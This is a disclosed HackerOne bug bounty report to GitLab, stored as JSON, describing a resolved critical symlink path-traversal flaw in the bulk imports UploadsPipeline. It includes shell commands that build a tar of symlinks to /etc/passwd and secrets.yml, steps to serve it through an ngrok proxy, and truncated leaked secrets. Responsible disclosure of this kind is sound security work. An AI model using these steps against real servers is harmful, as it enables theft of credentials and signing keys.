{
  "id": 1439593,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDM5NTkz",
  "url": "https://hackerone.com/reports/1439593",
  "title": "Arbitrary file read  via the bulk imports UploadsPipeline",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2022-01-03T01:57:53.959Z",
  "submitted_at": "2022-01-03T01:57:54.059Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "vakzz",
    "url": "/vakzz",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/6zbovkumst7oljmo9v21pig3yh9j/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef?response-content-disposition=inline%3B%20filename%3D%2294971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg%22%3B%20filename%2A%3DUTF-8%27%2794971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXT4DERRQ%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T001309Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEH0aCXVzLXdlc3QtMiJIMEYCIQC11Miz1cjNNXKzJTdEEtlkCcJ594CxI%2FZGJyXldINcHwIhAN1HIJ6z0FHBLTMESFgOI%2BEAHcaT1OAtdSz%2BULEfZ7IcKrsFCPb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igx8pMMNo%2F0UzhY4QW0qjwUT6rwtcKyUFqZ03Y8aP97Kjfl6fhibAMK1HSmo2x9RkRFgxHW%2FDhItExYKg5xdLkWgXroI8IsbMuTkYDgxjVtPYKsxQPT0FiVDVrvUBzVtlShiNfeoR6F9L7egr9Ucw91%2FRU56%2B6U%2B1PBf5Jsy8g8jzVcD8K8gLBdAsLTCgTalQdSlNoXvEqjDdwjZ17Ld5pYe%2Blbr%2B2J%2FNVuFZS4ibcGRU1i1MixSQIGkH7o%2BK0pOeybw9DInFx36QSQ0YyeSl0Ygq9nWQJQHmoy73ahJSfCPdEh4BliTUvHqZs0MY3sO1sIeggIRpK6rD9bFV7jQ8jc1QpeahL5ddIz9cIimvhks2EgTYb641Km%2FEQBoElxHX7%2BLqve1gWN8%2F1dkAxvoICzmvq7Osw3lRm9od3bB0i6msga0NLBwkIx%2FAwJmT6GgaLo3mbZ324HtcGn2oEV8Pasb9x5XeuJsNksd3E5%2BMU9ZLs9tjmH%2F1%2Bz4Tkf0A7vQRs51MVhUk%2Bee%2BM2TVp2tHv%2F4Wla1DDiDHxBawEhDYM4U0xQdiZLfOzevl%2BkXvZrMwFe%2F0cV3xjluLeJfmRzfhd0tVxGdZNI3UtVswuapjKg%2Bx0NV2znk8YU9odspxXnKVrM8nqQhVbnws%2FIHQGx4P7yswwoLq80qs2ZyIcTMOAoKgjvc0l%2FUemEVe8u4HcAldHVvu4Oa1KPDP4sYvSZ9pyIt5Y8l4maDzUg88Qcf9rguhyciSO94lQ0qqLDW8nbCxox47h6ZjWFwLaxvU7RiYvSzr7hD%2FUnxtzHsE9kuXZorQn22Vj6pd4twgY6PPVOVq5UfbHEEmbwnLbuFUGCIZRoPhqNpMwbYZveE6hPPWSmBIAKDHPOGLHlbPDjfOZhsMO2tvMYGOrAB72ce509bguRZhVh5qAd92hjXYy3U0ySE6T2gegLTYyTVbZQG0A9J9al0ZdZ00SIRn9hXeLIgiy1zhug1NpM44mf8JOuD3LDhNHOYBD1IZqnZ9oL%2FYP7GzZ2r6Mw3fdaMAaSFhG9Fnz6QpMjknTvawMwUZskNNUQ%2BI70sEC5%2Bt%2FMvjo5zem7icAW6QEie4JhYhMP1ScMES66G%2Fnww3jXLdv7wvMTd%2B514r%2FhvwSmszdw%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=576d4f405048366f059b54e11a0bd50c01335c1f724386a013bf7f4eb836d0c5"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 264,
    "url": "https://hackerone.com/gitlab",
    "handle": "gitlab",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "GitLab",
      "twitter_handle": "gitlab",
      "website": "https://about.gitlab.com",
      "about": "A single application for the entire software development lifecycle."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2022-03-21T14:46:33.605Z",
  "bug_reporter_agreed_on_going_public_at": "2022-02-22T22:13:50.553Z",
  "team_member_agreed_on_going_public_at": "2022-03-21T14:46:33.367Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "### Summary\n\nThe bulk imports api does not remove symlinks when untaring the uploads.tar.gz file, allowing arbitrary files to be read and uploaded when importing a group.\n\nWhen a group has uploads (such as markdown attachments), an `uploads.tar.gz` file will be downloaded and extracted in the `UploadsPipeline`:\nhttps://gitlab.com/gitlab-org/gitlab/-/blob/v14.6.0-ee/lib/bulk_imports/common/pipelines/uploads_pipeline.rb#L15\n```ruby\n       def extract(context)\n          download_service(tmp_dir, context).execute\n          untar_zxf(archive: File.join(tmp_dir, FILENAME), dir: tmp_dir)\n          upload_file_paths = Dir.glob(File.join(tmp_dir, '**', '*'))\n\n          BulkImports::Pipeline::ExtractedData.new(data: upload_file_paths)\n        end\n```\n\nSince `untar_zxf` only changes the permissions, any symlinks that are extracted from the tar will remain and be added to the list of file paths. When `load` is called, the symlinks will be followed and used as the content for the new file:\n\nhttps://gitlab.com/gitlab-org/gitlab/-/blob/v14.6.0-ee/lib/bulk_imports/common/pipelines/uploads_pipeline.rb#L23\n```ruby\n        def load(context, file_path)\n          avatar_path = AVATAR_PATTERN.match(file_path)\n\n          return save_avatar(file_path) if avatar_path\n\n          dynamic_path = file_uploader.extract_dynamic_path(file_path)\n\n          return unless dynamic_path\n          return if File.directory?(file_path)\n\n          named_captures = dynamic_path.named_captures.symbolize_keys\n\n          UploadService.new(context.portable, File.open(file_path, 'r'), file_uploader, **named_captures).execute\n        end\n``` \n\nThis can be used to read any file that the git user has read access to such as secrets.yml or other sensitive files.\n\n### Steps to reproduce\n\n1. Create a new group on gitlab.com\n1. Create a new milestone and upload a file `passwd` with any content into the description\n1. Make note of the upload secret (the 32 byte hash in the path)\n1. Run the following commands to make a tar file, using the hash from above\n    ```bash\nmkdir ./d3209c811fee407218bff7cb3b4333e6\nln -s /etc/passwd ./d3209c811fee407218bff7cb3b4333e6/passwd\nln -s /srv/gitlab/config/secrets.yml ./d3209c811fee407218bff7cb3b4333e6/secrets.yml\ntar cvzf uploads.tar.gz ./d3209c811fee407218bff7cb3b4333e6\n    ```\n\n1. Save the following simple proxy server as `api.py` and run it with `FLASK_APP=api flask run`, this will replace the `uploads.tar.gz` with a custom one: {F1565789}\n1. Start [ngrok](https://ngrok.com/) so that it's externally accessible: `ngrok http 5000`\n1. Create a new access token at https://gitlab.com/-/profile/personal_access_tokens\n1. Create a new group, this time choose import group\n1. Enter the https ngrok url and the token you just created\n1. Select the group you initially created and choose a new name\n1. Once the import has complete, view the milestone and click the passwd link\n1. You will see the passwd file from the gitlab server\n1. Copy the link and change `passwd` to `secrets.yml` and you should be able to download the secrets file\n\n\n### Impact\n\nA user with access to import a group on gitlab can read arbitrary files on the gitlab server\n\n### Examples\n\nExample with `passwd` and `secrets.yml` attached:\nhttps://gitlab.com/groups/group_to_import_1/-/milestones/1\nhttps://gitlab.com/groups/group_to_import_1/-/uploads/d3209c811fee407218bff7cb3b4333e6/passwd\nhttps://gitlab.com/groups/group_to_import_1/-/uploads/d3209c811fee407218bff7cb3b4333e6/secrets.yml\n\n### What is the current *bug* behavior?\nSymlinks are not removed or filtered when the `UploadsPipeline` is run for the bulk imports api\n\n### What is the expected *correct* behavior?\nSymlinks should be removed similar to the project import\n\n### Relevant logs and/or screenshots\n/etc/passwd file:\n```\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\ngit:x:1000:1000:GitLab,,,:/home/git:/bin/bash\n```\n\n/srv/gitlab/config/secrets.yml file:\n```yaml\nproduction:\n  secret_key_base: 1174116b6adee.....\n  otp_key_base: staging-a680efdeb2e93751f32.....\n  db_key_base: 1174116b6adee59.....\n  openid_connect_signing_key: |\n    -----BEGIN RSA PRIVATE KEY-----\n    MIIJKQIBAAKCAgEA5RyvCSgBoOGNE03CMcJ9.....\n    -----END RSA PRIVATE KEY-----\n  ci_jwt_signing_key: |\n    -----BEGIN RSA PRIVATE KEY-----\n    MIIEpAIBAAKCAQEAvazHHoAHZB5j9RUyq0CEK9.....\n    -----END RSA PRIVATE KEY-----\n\n\n### Output of checks\nThis bug happens on GitLab.com\n\n## Impact\n\nA user with access to import a group on gitlab can read arbitrary files on the gitlab server",
  "bounty_amount": "29000.0",
  "formatted_bounty": "$29,000",
  "weakness": {
    "id": 19,
    "name": "Path Traversal"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 1565789,
      "file_name": "api.py",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/rieofs59z26l2pfwmk9ykzudknwj?response-content-disposition=attachment%3B%20filename%3D%22api.py%22%3B%20filename%2A%3DUTF-8%27%27api.py&response-content-type=text%2Fx-python-script&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXT4DERRQ%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T001309Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEH0aCXVzLXdlc3QtMiJIMEYCIQC11Miz1cjNNXKzJTdEEtlkCcJ594CxI%2FZGJyXldINcHwIhAN1HIJ6z0FHBLTMESFgOI%2BEAHcaT1OAtdSz%2BULEfZ7IcKrsFCPb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igx8pMMNo%2F0UzhY4QW0qjwUT6rwtcKyUFqZ03Y8aP97Kjfl6fhibAMK1HSmo2x9RkRFgxHW%2FDhItExYKg5xdLkWgXroI8IsbMuTkYDgxjVtPYKsxQPT0FiVDVrvUBzVtlShiNfeoR6F9L7egr9Ucw91%2FRU56%2B6U%2B1PBf5Jsy8g8jzVcD8K8gLBdAsLTCgTalQdSlNoXvEqjDdwjZ17Ld5pYe%2Blbr%2B2J%2FNVuFZS4ibcGRU1i1MixSQIGkH7o%2BK0pOeybw9DInFx36QSQ0YyeSl0Ygq9nWQJQHmoy73ahJSfCPdEh4BliTUvHqZs0MY3sO1sIeggIRpK6rD9bFV7jQ8jc1QpeahL5ddIz9cIimvhks2EgTYb641Km%2FEQBoElxHX7%2BLqve1gWN8%2F1dkAxvoICzmvq7Osw3lRm9od3bB0i6msga0NLBwkIx%2FAwJmT6GgaLo3mbZ324HtcGn2oEV8Pasb9x5XeuJsNksd3E5%2BMU9ZLs9tjmH%2F1%2Bz4Tkf0A7vQRs51MVhUk%2Bee%2BM2TVp2tHv%2F4Wla1DDiDHxBawEhDYM4U0xQdiZLfOzevl%2BkXvZrMwFe%2F0cV3xjluLeJfmRzfhd0tVxGdZNI3UtVswuapjKg%2Bx0NV2znk8YU9odspxXnKVrM8nqQhVbnws%2FIHQGx4P7yswwoLq80qs2ZyIcTMOAoKgjvc0l%2FUemEVe8u4HcAldHVvu4Oa1KPDP4sYvSZ9pyIt5Y8l4maDzUg88Qcf9rguhyciSO94lQ0qqLDW8nbCxox47h6ZjWFwLaxvU7RiYvSzr7hD%2FUnxtzHsE9kuXZorQn22Vj6pd4twgY6PPVOVq5UfbHEEmbwnLbuFUGCIZRoPhqNpMwbYZveE6hPPWSmBIAKDHPOGLHlbPDjfOZhsMO2tvMYGOrAB72ce509bguRZhVh5qAd92hjXYy3U0ySE6T2gegLTYyTVbZQG0A9J9al0ZdZ00SIRn9hXeLIgiy1zhug1NpM44mf8JOuD3LDhNHOYBD1IZqnZ9oL%2FYP7GzZ2r6Mw3fdaMAaSFhG9Fnz6QpMjknTvawMwUZskNNUQ%2BI70sEC5%2Bt%2FMvjo5zem7icAW6QEie4JhYhMP1ScMES66G%2Fnww3jXLdv7wvMTd%2B514r%2FhvwSmszdw%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0f090464619022430332023b757a33cb246e3647647f8e86632ca642095b5752",
      "file_size": 1336,
      "type": "text/x-python-script",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": null,
  "vote_count": 313,
  "voters": [
    "theranger",
    "njmulsqb",
    "monkelife",
    "ra5h",
    "is-",
    "jumpydata",
    "orange303",
    "mr-medi",
    "pesmund",
    "catz",
    "and 303 more..."
  ],
  "severity": {
    "rating": "critical",
    "score": 9.6,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "low",
      "user_interaction": "none",
      "scope": "changed",
      "confidentiality": "high",
      "integrity": "high",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 18138,
    "asset_type": "URL",
    "asset_identifier": "gitlab.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
